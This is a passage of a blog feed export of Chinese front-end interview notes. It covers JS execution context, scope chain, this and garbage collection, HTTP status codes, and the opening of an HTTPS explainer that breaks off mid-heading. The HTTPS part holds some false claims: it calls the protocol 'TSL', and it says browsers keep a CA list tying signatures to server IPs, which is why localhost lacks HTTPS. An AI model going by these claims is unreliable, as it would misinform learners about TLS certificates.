plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function b() &#123;</span><br><span class="line">    console.log(&#x27;b&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">var a;</span><br><span class="line">a = 1;</span><br><span class="line">b();</span><br></pre></td></tr></table></figure><p>这里没有展开，其实展开也可以牵涉到很多内容的<br />譬如可以提下变量声明，函数声明，形参，实参的优先级顺序，以及 es6 中 let 有关的临时死区等<br><a name="section-15-3"></a></p><h3 id="JS-的执行阶段"><a href="#JS-的执行阶段" class="headerlink" title="JS 的执行阶段"></a>JS 的执行阶段</h3><p>此阶段的内容中的图片来源：<a href="http://www.cnblogs.com/TomXu/archive/2012/01/12/2308594.html">深入理解 JavaScript 系列（10）：JavaScript 核心（晋级高手必读篇）</a><br />解释器解释完语法规则后，就开始执行，然后整个执行流程中大致包含以下概念：</p><ul><li>执行上下文，执行堆栈概念（如全局上下文，当前活动上下文）</li><li>VO（变量对象）和 AO（活动对象）</li><li>作用域链</li><li>this 机制等</li></ul><p>这些概念如果深入讲解的话内容过多，因此这里仅提及部分特性<br /><strong>执行上下文简单解释</strong></p><ul><li>JS 有<code>执行上下文</code>）</li><li>浏览器首次载入脚本，它将创建<code>全局执行上下文</code>，并压入执行栈栈顶（不可被弹出）</li><li>然后每进入其它作用域就创建对应的执行上下文并把它压入执行栈的顶部</li><li>一旦对应的上下文执行完毕，就从栈顶弹出，并将上下文控制权交给当前的栈。</li><li>这样依次执行（最终都会回到全局执行上下文）</li></ul><p>譬如，如果程序执行完毕，被弹出执行栈，然后有没有被引用（没有形成闭包），那么这个函数中用到的内存就会被垃圾处理器自动回收</p><p>然后执行上下文与 VO，作用域链，this 的关系是：<br />每一个执行上下文，都有三个重要属性：</p><ul><li>变量对象(<code>Variable object，VO</code>)</li><li>作用域链(<code>Scope chain</code>)</li><li><code>this</code></li></ul><p><strong>VO 与 AO</strong><br />VO 是执行上下文的属性（抽象概念），但是<strong>只有全局上下文的变量对象允许通过 VO 的属性名称来间接访问（因为在全局上下文里，全局对象自身就是变量对象）</strong><br />AO（<code>activation object</code>)，当函数被调用者激活，AO 就被创建了<br />可以理解为：</p><ul><li>在函数上下文中：<code>VO === AO</code></li><li>在全局上下文中：<code>VO === this === global</code></li></ul><p>总的来说，VO 中会存放一些变量信息（如声明的变量，函数，<code>arguments</code>参数等等）<br /><strong>作用域链</strong><br />它是执行上下文中的一个属性，原理和原型链很相似，作用很重要。<br />譬如流程简述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在函数上下文中，查找一个变量foo</span><br><span class="line">如果函数的VO中找到了，就直接使用</span><br><span class="line">否则去它的父级作用域链中（__parent__）找</span><br><span class="line">如果父级中没找到，继续往上找</span><br><span class="line">直到全局上下文中也没找到就报错</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596829648-61214bf4-f712-43b1-92ac-4a73ebee5594.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1588596829648-61214bf4-f712-43b1-92ac-4a73ebee5594.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br /><strong>this 指针</strong><br />这也是 JS 的核心知识之一，由于内容过多，这里就不展开，仅提及部分<br />注意：<strong>this 是执行上下文环境的一个属性，而不是某个变量对象的属性</strong><br />因此:</p><ul><li>this 是没有一个类似搜寻变量的过程</li><li>当代码中使用了 this，这个 this 的值就直接从执行的上下文中获取了，而不会从作用域链中搜寻</li><li>this 的值只取决中进入上下文时的情况</li></ul><p>所以经典的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var baz = 200;</span><br><span class="line">var bar = &#123;</span><br><span class="line">    baz: 100,</span><br><span class="line">    foo: function() &#123;</span><br><span class="line">        console.log(this.baz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var foo = bar.foo;</span><br><span class="line">// 进入环境：global</span><br><span class="line">foo(); // 200，严格模式中会报错，Cannot read property &#x27;baz&#x27; of undefined</span><br><span class="line">// 进入环境：global bar</span><br><span class="line">bar.foo(); // 100</span><br></pre></td></tr></table></figure><p>就要明白了上面 this 的介绍，上述例子很好理解<br />更多参考：<br /><a href="http://www.cnblogs.com/TomXu/archive/2012/01/17/2310479.html">深入理解 JavaScript 系列（13）：This? Yes,this!</a><br><a name="section-15-4"></a></p><h3 id="回收机制"><a href="#回收机制" class="headerlink" title="回收机制"></a>回收机制</h3><p>JS 有垃圾处理器，所以无需手动回收内存，而是由垃圾处理器自动处理。<br />一般来说，垃圾处理器有自己的回收策略。<br />譬如对于那些执行完毕的函数，如果没有外部引用（被引用的话会形成闭包），则会回收。（当然一般会把回收动作切割到不同的时间段执行，防止影响性能）<br />常用的两种垃圾回收规则是：</p><ul><li>标记清除</li><li>引用计数</li></ul><p>Javascript 引擎基础 GC 方案是（<code>simple GC</code>）：<code>mark and sweep</code>（标记清除），简单解释如下：</p><ol><li>遍历所有可访问的对象。</li><li>回收已不可访问的对象。</li></ol><p>譬如：（出自 javascript 高程）</p><blockquote><p>当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。<br>从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。<br>而当变量离开环境时，则将其标记为“离开环境”。<br>垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。<br>然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包，也就是说在环境中的以及相关引用的变量会被去除标记）。<br>而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。<br>最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。</p></blockquote><p>关于引用计数，简单点理解：<br /><strong>跟踪记录每个值被引用的次数，当一个值被引用时，次数</strong><code>**+1**</code><strong>，减持时</strong><code>**-1**</code><strong>，下次垃圾回收器会回收次数为</strong><code>**0**</code><strong>的值的内存（当然了，容易出循环引用的 bug）</strong><br /><strong>GC 的缺陷</strong><br />和其他语言一样，javascript 的 GC 策略也无法避免一个问题： <strong>GC 时，停止响应其他操作</strong><br />这是为了安全考虑。<br />而 Javascript 的 GC 在<code>100ms</code>甚至以上<br />对一般的应用还好，但对于 JS 游戏，动画对连贯性要求比较高的应用，就麻烦了。<br />这就是引擎需要优化的点： <strong>避免 GC 造成的长时间停止响应。</strong><br /><strong>GC 优化策略</strong><br />这里介绍常用到的：<strong>分代回收（Generation GC）</strong><br />目的是通过区分“临时”与“持久”对象:</p><ul><li>多回收“临时对象”区（<code>young generation</code>）</li><li>少回收“持久对象”区（<code>tenured generation</code>）</li><li>减少每次需遍历的对象，从而减少每次 GC 的耗时。</li></ul><p>像 node v8 引擎就是采用的分代回收（和 java 一样，作者是 java 虚拟机作者。）<br />更多可以参考：<br /><a href="https://zhuanlan.zhihu.com/p/33816534">V8 内存浅析</a><br><a name="section-16"></a></p><h2 id="其它-1"><a href="#其它-1" class="headerlink" title="其它"></a>其它</h2><p><a name="section-16-1"></a></p><h3 id="可以提到跨域"><a href="#可以提到跨域" class="headerlink" title="可以提到跨域"></a>可以提到跨域</h3><p>譬如发出网络请求时，会用 AJAX，如果接口跨域，就会遇到跨域问题<br />可以参考：<br /><a href="https://segmentfault.com/a/1190000012469713">ajax 跨域，这应该是最全的解决方案了</a><br><a name="section-16-2"></a></p><h3 id="可以提到-web-安全"><a href="#可以提到-web-安全" class="headerlink" title="可以提到 web 安全"></a>可以提到 web 安全</h3><p>譬如浏览器在解析 HTML 时，有<code>XSSAuditor</code>，可以延伸到 web 安全相关领域<br />可以参考：<br /><a href="https://segmentfault.com/a/1190000012693772">AJAX 请求真的不安全么？谈谈 Web 安全与 AJAX 的关系。</a><br><a name="section-16-3"></a></p><h3 id="更多-1"><a href="#更多-1" class="headerlink" title="更多"></a>更多</h3><p>如可以提到<code>viewport</code>概念，讲讲物理像素，逻辑像素，CSS 像素等概念<br />如熟悉 Hybrid 开发的话可以提及一下 Hybrid 相关内容以及优化<br />…<br><a name="section-17"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述这么多内容，目的是：<strong>梳理出自己的知识体系</strong><br />本文由于是前端向，所以知识梳理时有重点，很多其它的知识点都简述或略去了，重点介绍的模块总结：</p><ul><li>浏览器的进程&#x2F;线程模型、JS 运行机制（这一块的详细介绍链接到了另一篇文章）</li><li>http 规范（包括报文结构，头部，优化，http2.0，https 等）</li><li>http 缓存（单独列出来，因为它很重要）</li><li>页面解析流程（HTML 解析，构建 DOM，生成 CSS 规则，构建渲染树，渲染流程，复合层的合成，外链的处理等）</li><li>JS 引擎解析过程（包括解释阶段，预处理阶段，执行阶段，包括执行上下文、VO、作用域链、this、回收机制等）</li><li>跨域相关，web 安全单独链接到了具体文章，其它如 CSS 盒模型，viewport 等仅是提及概念</li></ul><p>关于本文的价值？<br /><strong>本文是个人阶段性梳理知识体系的成果</strong>，然后加以修缮后发布成文章，因此并不确保适用于所有人员<br />但是，个人认为本文还是有一定参考价值的<br><a name="section-18"></a></p><h2 id="写在最后的话"><a href="#写在最后的话" class="headerlink" title="写在最后的话"></a>写在最后的话</h2><p>还是那句话：<strong>知识要形成体系</strong><br />梳理出知识体系后，有了一个骨架，知识点不易遗忘，而且学习新知识时也会更加迅速，更重要的是容易举一反三，可以由一个普通的问题，深挖拓展到底层原理<br />前端知识是无穷无尽的，本文也仅仅是简单梳理出一个承载知识体系的骨架而已，更多的内容仍然需要不断学习，积累<br />另外，本文结合<a href="https://segmentfault.com/a/1190000012925872">从浏览器多进程到 JS 单线程，JS 运行机制最全面的一次梳理</a>这篇文章，更佳噢！<br><a name="section-19"></a></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><a name="section-19-1"></a></p><h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p>初次发布<code>2018.03.12</code>于我个人博客上面<br /><a href="http://www.dailichun.com/2018/03/12/whenyouenteraurl.html">http://www.dailichun.com/2018/03/12/whenyouenteraurl.html</a><br><a name="section-19-2"></a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://segmentfault.com/a/1190000012925872">https://segmentfault.com/a/1190000012925872</a></li><li><a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/">https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/</a></li><li><a href="https://coolshell.cn/articles/9666.html">https://coolshell.cn/articles/9666.html</a></li><li><a href="http://igoro.com/archive/what-really-happens-when-you-navigate-to-a-url/">http://igoro.com/archive/what-really-happens-when-you-navigate-to-a-url/</a></li><li><a href="http://blog.csdn.net/dojiangv/article/details/51794535">http://blog.csdn.net/dojiangv/article/details/51794535</a></li><li><a href="http://bbs.csdn.net/topics/340204423">http://bbs.csdn.net/topics/340204423</a></li><li><a href="https://segmentfault.com/a/1190000004246731">https://segmentfault.com/a/1190000004246731</a></li><li><a href="http://www.bubuko.com/infodetail-1379568.html">http://www.bubuko.com/infodetail-1379568.html</a></li><li><a href="http://fex.baidu.com/blog/2014/05/what-happen/">http://fex.baidu.com/blog/2014/05/what-happen/</a></li><li><a href="http://www.cnblogs.com/winter-cn/archive/2013/05/21/3091127.html">http://www.cnblogs.com/winter-cn/archive/2013/05/21/3091127.html</a></li><li><a href="https://fanerge.github.io/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-webkit%E5%86%85%E6%A0%B8%E7%A0%94%E7%A9%B6.html">https://fanerge.github.io/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-webkit%E5%86%85%E6%A0%B8%E7%A0%94%E7%A9%B6.html</a></li><li><a href="http://www.cnblogs.com/TomXu/archive/2012/01/12/2308594.html">http://www.cnblogs.com/TomXu/archive/2012/01/12/2308594.html</a></li><li><a href="https://segmentfault.com/q/1010000000489803">https://segmentfault.com/q/1010000000489803</a></li></ul><blockquote><p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请求中常见的状态码</title>
      <link href="/2019/10/24/frontend/browser/qing-qiu-zhong-chang-jian-de-zhuang-tai-ma/"/>
      <url>/2019/10/24/frontend/browser/qing-qiu-zhong-chang-jian-de-zhuang-tai-ma/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><a name="vXcr4"></a>### 状态码是什么？客户端HTTP请求的返回标志，由3个十进制数字组成。<br />第一个数字：状态码的分类<br />后面两个数字：不同分类情况下的不同状态<a name="iFNoU"></a>### 最常见报错的状态码有哪些？<ol><li>304：有缓存， 自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。</li><li>400：请求内容有误，服务器不理解请求的语法。一般请求的内容写错或者格式不正确可能会出现这种错误</li><li>404：服务器上无法找到请求的资源，除此之外，也可以在服务器拒绝请求但不想给拒绝原因时使用；</li><li>405：请求的方法不正确，例如定义的是 post 方式，请求写的是 get 就会报这种错</li><li>500：服务器内部错误，服务器遇到错误，无法完成请求。</li><li>502：错误网关，我一般遇见这个会出现在 ngnix 没有启动或者代理写错的时候<br><a name="zriL2"></a></li></ol><h3 id="总体概括"><a href="#总体概括" class="headerlink" title="总体概括"></a>总体概括</h3><p><a name="p4ZiA"></a></p><h4 id="1xx-：临时响应，需要请求者继续执行操作的状态代码"><a href="#1xx-：临时响应，需要请求者继续执行操作的状态代码" class="headerlink" title="1xx ：临时响应，需要请求者继续执行操作的状态代码"></a>1xx ：临时响应，需要请求者继续执行操作的状态代码</h4><table><thead><tr><th>100</th><th>表示服务器已经收到一部分请求正在等待剩余不符</th></tr></thead><tbody><tr><td>101</td><td>切换协议 要求服务器切换协议，并且服务器已确认并准备切换</td></tr></tbody></table><p><a name="KHEnD"></a></p><h4 id="2xx-：成功，请求已经成功"><a href="#2xx-：成功，请求已经成功" class="headerlink" title="2xx ：成功，请求已经成功"></a>2xx ：成功，请求已经成功</h4><table><thead><tr><th>200</th><th>请求成功</th></tr></thead><tbody><tr><td>201</td><td>已创建 请求成功并且服务器创建了新的资源</td></tr><tr><td>202</td><td>已接收 服务器已接收请求，但尚未处理</td></tr><tr><td>203</td><td>非授权信息 服务器已经成功处理了请求，但返回的信息来自于另外源</td></tr><tr><td>204</td><td>没有任何返回内容的成功请求，不更新文档视图</td></tr><tr><td>205</td><td>没有任何返回内容的成功请求，必须重置文档视图</td></tr><tr><td>206</td><td>成功处理了部分 GET 请求</td></tr></tbody></table><p><a name="mbJ3o"></a></p><h4 id="3xx-：重定向"><a href="#3xx-：重定向" class="headerlink" title="3xx ：重定向"></a>3xx ：重定向</h4><table><thead><tr><th>300</th><th>可选择的重定向资源</th></tr></thead><tbody><tr><td>301</td><td>请求资源已永久移动到新位置</td></tr><tr><td>302</td><td>请求的资源现在从不同的 URL 响应请求</td></tr><tr><td>303</td><td>当前请求的响应可以在另一个 URL 上找到</td></tr><tr><td>304</td><td>本次请求的内容和之前的一样没有变化</td></tr></tbody></table><p><a name="bV6Y1"></a></p><h4 id="4xx-：客户端响应"><a href="#4xx-：客户端响应" class="headerlink" title="4xx ：客户端响应"></a>4xx ：客户端响应</h4><table><thead><tr><th>400</th><th>语义有误，当前请求无法被服务器理解。请求参数有误</th></tr></thead><tbody><tr><td>401</td><td>当前请求需要用户验证</td></tr><tr><td>403</td><td>服务器拒绝的请求</td></tr><tr><td>404</td><td>请求资源没有在服务器上找到，请求失败</td></tr><tr><td>405</td><td>请求的方法不正确</td></tr></tbody></table><p><a name="AU3Jh"></a></p><h4 id="5xx-：服务器端响应"><a href="#5xx-：服务器端响应" class="headerlink" title="5xx ：服务器端响应"></a>5xx ：服务器端响应</h4><table><thead><tr><th>500</th><th>服务器不知道如何处理</th></tr></thead><tbody><tr><td>501</td><td>请求方法不被服务器支持</td></tr><tr><td>502</td><td>服务器的忘光得到一个错误的响应</td></tr><tr><td>503</td><td>服务器没有准备好处理请求，服务器在维护或者重载或者停机了</td></tr><tr><td>504</td><td>网关请求超时</td></tr><tr><td>505</td><td>服务器不支持请求中所使用的 HTTP 协议版本</td></tr></tbody></table><p>每种状态码下的分类只写到了 5 或者 6，没有再往多的写，对于我们日常的使用足够了，如果有不在上面的分类的请到以下参考地址<br /><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status#%E6%88%90%E5%8A%9F%E5%93%8D%E5%BA%94">HTTP 参考地址请点击</a></p><p><strong>I suppose some things are worth the wait.</strong><br /><strong>生命中有些事值得等待。</strong></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 状态码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Https</title>
      <link href="/2019/08/15/frontend/browser/https/"/>
      <url>/2019/08/15/frontend/browser/https/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>HTTPS 是在 HTTP 上建立 SSL 加密层，并对传输数据进行加密，是 HTTP 协议的安全版。现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。<br /><code>HTTPS</code>使用的是<code>TSL</code>协议（<code>SSL</code>是<code>TSL</code>协议的一种）。</p><p><a name="IOK6P"></a></p><h2 id="HTTPS-的功能"><a href="#HTTPS-的功能" class="headerlink" title="HTTPS 的功能"></a>HTTPS 的功能</h2><ul><li><strong>内容加密，</strong>对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全;<ul><li>非对称密钥加密：传输公钥时可能被截获并掉包，解决方案：使用第三方机构颁发的证书加密公钥（根据服务器地址等多个信息生成，无法被第三方伪造），浏览器收到后使用证书机构颁发的公钥进行解密（前提是浏览器要信任同一个证书颁发机构）解密结果与用证书生成的规则再生成一个签名对比一致就是真证书；</li><li>对称密钥加密：中间人随意截获。</li></ul></li><li><strong>身份认证，</strong>对网站服务器进行真实身份认证。<ul><li>数字证书</li></ul></li><li><strong>数据完整性</strong></li></ul><p>我们经常会在 Web 的登录页面和购物结算界面等使用 HTTPS 通信。使用 HTTPS 通信时，不再用<code>http://</code>，而是改用<code>https://</code>。另外，当浏览器访问 HTTPS 通信有效的 Web 网站时，浏览器的地址栏内会出现一个带锁的标记。对 HTTPS 的显示方式会因浏览器的不同而有所改变。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216775859-581b6650-dd85-4d01-8a72-07fd24a166dd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216775859-581b6650-dd85-4d01-8a72-07fd24a166dd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="cKLDt"></a></p><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>发送方和接收方需要持有同一把密钥，发送消息和接收消息均使用该密钥。相对于非对称加密，对称加密具有更高的加解密速度，但双方都需要事先知道密钥，密钥在传输过程中可能会被窃取，因此安全性没有非对称加密高。</p><p><a name="x7TYm"></a></p><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>接收方在发送消息前需要事先生成公钥和私钥，然后将公钥发送给发送方。发送放收到公钥后，将待发送数据用公钥加密，发送给接收方。接收到收到数据后，用私钥解密。<br />在这个过程中，公钥负责加密，私钥负责解密，数据在传输过程中即使被截获，攻击者由于没有私钥，因此也无法破解。<br />非对称加密算法的加解密速度低于对称加密算法，但是安全性更高。</p><p><a name="r3hH1"></a></p><h2 id="几个名词要理清"><a href="#几个名词要理清" class="headerlink" title="几个名词要理清"></a>几个名词要理清</h2><ul><li>RSA：非对称加密</li><li>AES：对称加密 生成一个随机字符串 key 只有客户端和服务端有 他们两个通过这个 key 对数据加密和传输跟解密 这一个统称对称加密</li><li>CA：权威认证机构 服务器在建站的时候 去 CA 认证机构认证 得到对应的数字签名 相当于身份证号 客户端每次安装浏览器的时候 都会下载最新的 CA 列表 这个列表有对应的数字签名和服务器 IP 一一对应的列表 这就是为什么我们自己搭建的 localhost 没法发 https 的原因 因为没法进行 CA 认证</li><li>数字证书：包含了数字签名跟 RSA 公钥</li><li>数字签名：保证数字证书一定是服务器传给客户端的 相当于服务器的身份证 ID</li><li>对称密钥： 对数据进行加密的 key</li><li>非对称密钥： （k1， k2） k1 加密的数据 只有 k2 能解开 k1 位非对称公钥 k2 为非对称私钥</li><li>非对称公钥：RSA 公钥 k1 加密的数据 只有 k2 能解开</li><li>非对称私钥：RSA 私钥 k1 加密的数据 只有 k2 能解开</li></ul><blockquote><p><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA</a> 是一种广泛使用的非对称加密算法，严格来说并不等同于非对称加密，同样的对称加密算法除了 <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a> ，还有 DES，3DES 等等。</p></blockquote><p><a name="aHLQF"></a></p><h2 id="为什么需要-HTTPS"><a href="#为什么需要-HTTPS" class="headerlink" title="为什么需要 HTTPS"></a>为什么需要 HTTPS</h2><p><strong>在 HTTP 协议中有可能存在信息窃取或身份伪装等安全问题。使用 HTTPS 通信机制可以有效地防止这些问题。</strong><br><a name="g8XiL"></a></p><h3 id="HTTP-协议存在的哪些问题"><a href="#HTTP-协议存在的哪些问题" class="headerlink" title="HTTP 协议存在的哪些问题"></a>HTTP 协议存在的哪些问题</h3><p><a name="0PUiE"></a></p><h4 id="1、通信使用明文（不加密）——内容可能被窃听"><a href="#1、通信使用明文（不加密）——内容可能被窃听" class="headerlink" title="1、通信使用明文（不加密）——内容可能被窃听"></a>1、通信使用明文（不加密）——内容可能被窃听</h4><p>由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，<strong>HTTP 报文使用明文（指未经过加密的报文）方式发送</strong>。<br />HTTP 明文协议的缺陷是导致数据泄露、数据篡改、流量劫持、钓鱼攻击等安全问题的重要原因。HTTP 协议无法加密数据，所有通信数据都在网络中明文“裸奔”。通过网络的嗅探设备及一些技术手段，就可还原 HTTP 报文内容。<br><a name="m3zAR"></a></p><h4 id="2、无法证明报文的完整性——可能遭篡改"><a href="#2、无法证明报文的完整性——可能遭篡改" class="headerlink" title="2、无法证明报文的完整性——可能遭篡改"></a>2、无法证明报文的完整性——可能遭篡改</h4><p>所谓完整性是指信息的准确度。若无法证明其完整性，通常也就意味着无法判断信息是否准确。由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。<br />换句话说，<strong>没有任何办法确认，发出的请求&#x2F;响应和接收到的请求&#x2F;响应是前后相同的</strong>。<br><a name="3Zw9l"></a></p><h4 id="3、不验证通信方的身份——有可能遭遇伪装"><a href="#3、不验证通信方的身份——有可能遭遇伪装" class="headerlink" title="3、不验证通信方的身份——有可能遭遇伪装"></a>3、不验证通信方的身份——有可能遭遇伪装</h4><p><strong>HTTP 协议中的请求和响应不会对通信方进行确认</strong>。在 HTTP 协议通信时，由于不存在确认通信方的处理步骤，任何人都可以发起请求。另外，服务器只要接收到请求，不管对方是谁都会返回一个响应（但也仅限于发送端的 IP 地址和端口号没有被 Web 服务器设定限制访问的前提下）<br />HTTP 协议无法验证通信方身份，任何人都可以伪造虚假服务器欺骗用户，实现“钓鱼欺诈”，用户无法察觉。</p><p><a name="2EvNz"></a></p><h3 id="HTTPS-协议优势"><a href="#HTTPS-协议优势" class="headerlink" title="HTTPS 协议优势"></a>HTTPS 协议优势</h3><p>反观 HTTPS 协议，它比 HTTP 协议相比多了以下优势（下文会详细介绍）:</p><ul><li>数据隐私性：内容经过对称加密，每个连接生成一个唯一的加密密钥</li><li>数据完整性：内容传输经过完整性校验</li><li>身份认证：第三方无法伪造服务端（客户端）身份</li></ul><br /><a name="JTPVJ"></a>## HTTPS如何解决HTTP上述问题?HTTPS并非是应用层的一种新协议。只是HTTP通信接口部分用SSL和TLS协议代替而已。<br />通常，HTTP直接和TCP通信。当使用SSL时，则演变成先和SSL通信，再由SSL和TCP通信了。简言之，**所谓HTTPS，其实就是身披SSL协议这层外壳的HTTP**。<br />![image.png](https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1597216790803-23ec8d37-f653-43a3-8f99-d0f30e649fb1.png)<a name="uRu88"></a>### 1、解决内容可能被窃听的问题——加密<a name="Os7yv"></a>#### 方法1.对称加密这种方式加密和解密同用一个密钥。加密和解密都会用到密钥。**没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了**。<br />以对称加密方式加密时必须将密钥也发给对方。可究竟怎样才能安全地转交？在互联网上转发密钥时，如果通信被监听那么密钥就可会落人攻击者之手，同时也就失去了加密的意义。另外还得设法安全地保管接收到的密钥。<a name="0FzwQ"></a>#### 方法2.非对称加密公开密钥加密使用一对非对称的密钥。一把叫做私有密钥，另一把叫做公开密钥。顾名思义，**私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得**。<br />使用公开密钥加密方式，发送密文的一方使用**对方的公开密钥**进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。<br />![image.png](https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1591153515709-c746c4ae-13cf-4707-9668-34aa0bf433f7.png)<br />非对称加密的特点是信息传输一对多，服务器只需要维持一个私钥就能够和多个客户端进行加密通信。<br />这种方式有以下缺点：<ul><li>公钥是公开的，所以针对私钥加密的信息，黑客截获后可以使用公钥进行解密，获取其中的内容；</li><li>公钥并不包含服务器的信息，使用非对称加密算法无法确保服务器身份的合法性，存在中间人攻击的风险，服务器发送给客户端的公钥可能在传送过程中被中间人截获并篡改；</li><li>使用非对称加密<strong>在数据加密解密过程需要消耗一定时间</strong>，降低了数据传输效率；<br><a name="4LNXx"></a></li></ul><h4 id="方法-3-对称加密-非对称加密-HTTPS-采用这种方式"><a href="#方法-3-对称加密-非对称加密-HTTPS-采用这种方式" class="headerlink" title="方法 3.对称加密+非对称加密(HTTPS 采用这种方式)"></a>方法 3.对称加密+非对称加密(HTTPS 采用这种方式)</h4><p>使用对称密钥的好处是解密的效率比较快，使用非对称密钥的好处是可以使得传输的内容不能被破解，因为就算你拦截到了数据，但是没有对应的私钥，也是不能破解内容的。就比如说你抢到了一个保险柜，但是没有保险柜的钥匙也不能打开保险柜。那我们就将对称加密与非对称加密结合起来,充分利用两者各自的优势，<strong>在交换密钥环节使用非对称加密方式，之后的建立通信交换报文阶段则使用对称加密方式</strong>。<br />具体做法是：<strong>发送密文的一方使用对方的公钥进行加密处理“对称的密钥”，然后对方用自己的私钥解密拿到“对称的密钥”，这样可以确保交换的密钥是安全的前提下，使用对称加密方式进行通信</strong>。所以，HTTPS 采用对称加密和非对称加密两者并用的混合加密机制。<br><a name="VxtyC"></a></p><h3 id="2、解决报文可能遭篡改问题——数字签名"><a href="#2、解决报文可能遭篡改问题——数字签名" 